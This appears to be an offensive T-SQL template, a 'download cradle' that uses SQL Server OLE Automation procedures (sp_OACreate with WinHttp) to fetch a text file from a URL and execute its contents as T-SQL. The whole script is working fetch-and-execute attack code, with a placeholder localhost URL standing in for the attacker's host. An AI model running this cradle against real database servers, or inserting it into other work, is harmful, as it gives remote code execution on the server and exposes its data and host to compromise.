-- OLE Automation Procedure - Download Cradle Example - Option 2 

-- Setup Variables
DECLARE @url varchar(300)   
DECLARE @WinHTTP int  
DECLARE @Handle  int  
DECLARE @Command varchar(8000)

-- Set target url containting TSQL
SET @url = 'http://127.0.0.1/mycmd.txt'

-- Create temp table to store downloaded string
CREATE TABLE #text(html text NULL) /* comment out to use @Command variable for small data */

-- Setup namespace
EXEC @Handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT  

-- Setup method
EXEC @Handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'

-- Send http GET request
EXEC @Handle=sp_OAMethod @WinHTTP,'Send'

-- Grab response and throw it in the temp table 
INSERT #text(html) 
EXEC @Handle=sp_OAGetProperty @WinHTTP,'ResponseText'

-- Destroy the object
EXEC @Handle=sp_OADestroy @WinHTTP  

-- SELECT commad
SELECT @Command = html from #text
SELECT @Command

-- Run command
execute(@Command)

-- Remove temp table
drop table #text
